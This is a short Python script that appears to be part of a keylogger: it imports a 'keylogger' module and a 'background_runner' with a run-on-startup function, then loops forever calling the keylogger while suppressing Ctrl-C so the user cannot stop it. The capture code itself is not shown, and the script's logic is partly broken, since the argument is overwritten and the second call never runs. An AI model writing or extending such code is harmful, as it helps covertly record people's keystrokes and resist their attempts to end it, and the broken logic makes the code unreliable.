# keeps the code running forever

import sys
import time
import background_runner
import keylogger

def _suppress_keyboard_interrupt(exctype, value, tb):
    if exctype is KeyboardInterrupt:
        return
    sys.__excepthook__(exctype, value, tb)

sys.excepthook = _suppress_keyboard_interrupt


def run_forever(INPUT):

    INPUT = "background_runner.py"
    while True:
        try:
            keylogger.on_press(INPUT)
            time.sleep(0)
        except KeyboardInterrupt:
            print("\nKeyboardInterrupt. No problem", flush=True)
            try:
                time.sleep(0.1)
            except KeyboardInterrupt:
                pass
            continue
        except Exception as e:
            print(f"error occurred {e}", file=sys.stderr, flush=True)
            try:
                time.sleep(1)
            except KeyboardInterrupt:
                pass


if __name__ == "__main__":
    run_forever(background_runner.run_on_startup())
    run_forever(keylogger.on_press())
